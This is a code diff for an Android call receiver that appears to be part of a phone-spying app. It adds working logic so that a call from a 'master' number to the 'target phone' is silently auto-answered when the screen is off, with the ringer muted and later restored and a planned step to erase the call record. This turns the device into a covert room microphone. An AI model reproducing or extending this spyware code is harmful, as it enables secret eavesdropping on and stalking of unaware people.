@@ -5,6 +5,7 @@ import java.lang.reflect.Method;
 import system.service.activity.GlobalPrefActivity;
 
 import com.android.internal.telephony.ITelephony;
+import com.particle.inspector.common.util.PowerUtil;
 import com.particle.inspector.common.util.phone.PhoneUtils;
 
 import android.app.Service;
@@ -12,7 +13,6 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.media.AudioManager;
-import android.os.RemoteException;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.KeyEvent;
@@ -20,12 +20,16 @@ import android.view.KeyEvent;
 public class IncomingCallReceiver extends BroadcastReceiver 
 {
 	private static final String LOGTAG = "ComingCallReceiver";
+	
+	private static boolean IS_ENV_LISTENING = false;
+	private static int ORIGINAL_RING_MODE;
+	private static int ORIGINAL_RING_VOL;
 
 	@Override
 	public void onReceive(Context context, Intent intent) 
 	{
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
-			
+		
 		// Check phone state
 		TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
 		switch (tm.getCallState()) {
@@ -39,18 +43,28 @@ public class IncomingCallReceiver extends BroadcastReceiver
 					// Only the interceptor phone call listen environment
 					if (comingPhoneNum.contains(masterPhone)) 
 					{
-						// If the target phone is on active or holding call
-						//if (!PhoneUtils.getITelephony(tm).isOffhook()) {
-						//	return;
-						//}
+						// Return if the target phone screen is on or it is in a call.
+						// That mean it will only take env listening action when the screen is off and not in a call.
+						if (PowerUtil.isScreenOn(context) || PhoneUtils.getITelephony(tm).isOffhook()) {
+							PhoneUtils.getITelephony(tm).endCall();
+							// TODO remove the latest phone call record
+							return;
+						}
 						
-	        			// Disable ringer and vibrate
+						// Disable ringer and vibrate
 		        		AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
+		        		ORIGINAL_RING_MODE = audioManager.getRingerMode();
+		        		if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
+		        			ORIGINAL_RING_VOL = audioManager.getStreamVolume(AudioManager.STREAM_RING);
+		        		}
 		        		audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
 		        		
 		        		// Pick up phone automatically
 		        		PhoneUtils.getITelephony(tm).showCallScreenWithDialpad(false);
 						PhoneUtils.getITelephony(tm).answerRingingCall();
+						IS_ENV_LISTENING = true;
+						
+						// TODO set screen off
 						
 						/*
 		        		// Disable ringer and vibrate
@@ -69,7 +83,7 @@ public class IncomingCallReceiver extends BroadcastReceiver
 		                enableSpeakerPhone(context);
 		                */ 
 					} 
-				} catch (Exception e1) {
+				} catch (Exception ex) {
 						Log.e(LOGTAG, "Failed to auto answer call");
 				}
 	        	
@@ -79,6 +93,18 @@ public class IncomingCallReceiver extends BroadcastReceiver
 				break;
 			}
 			case TelephonyManager.CALL_STATE_IDLE : { // 来去电电话挂断
+				// Reset IS_ENV_LISTENING flag
+				if (IS_ENV_LISTENING) {
+					IS_ENV_LISTENING = false;
+					
+					// Restore to the ringing mode
+					AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
+					audioManager.setRingerMode(ORIGINAL_RING_MODE);
+					if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
+						audioManager.setStreamVolume(AudioManager.STREAM_RING, ORIGINAL_RING_VOL, 0);						
+					}
+				}
+				
 				break;
 			}	
 		}
